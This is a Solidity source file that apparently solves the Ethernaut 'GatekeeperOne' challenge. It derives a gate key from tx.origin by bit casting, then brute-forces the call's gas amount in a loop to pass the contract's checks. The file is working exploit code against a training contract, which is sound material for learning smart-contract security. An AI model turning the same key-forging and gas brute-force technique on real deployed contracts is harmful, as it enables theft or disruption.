// SPDX-License-Identifier: MIT
pragma solidity 0.8.19;

interface GatekeeperOne    {
    function enter(bytes8) external;
}

contract HackGatekeeper {
    event Failed(bytes reason, uint256 gasAmount);

    function attack(address gateAddress) public {
        GatekeeperOne gatekeeper = GatekeeperOne(gateAddress);

        uint16 a16 = uint16(uint160(tx.origin));
        // 0x1000000000.....a16 | casting it to uint 32 will delete first part with 1 at the start | uint32(uint64(_gateKey)) != uint64(_gateKey) will pass
        uint64 key = uint64(1 << 63) + uint64(a16);

        for (uint256 i=0; i<8191; i++) {
            try gatekeeper.enter{gas: i}(bytes8(key)){}
            catch(bytes memory reason){
                emit Failed(reason,  i);
            }
        }
    }
}
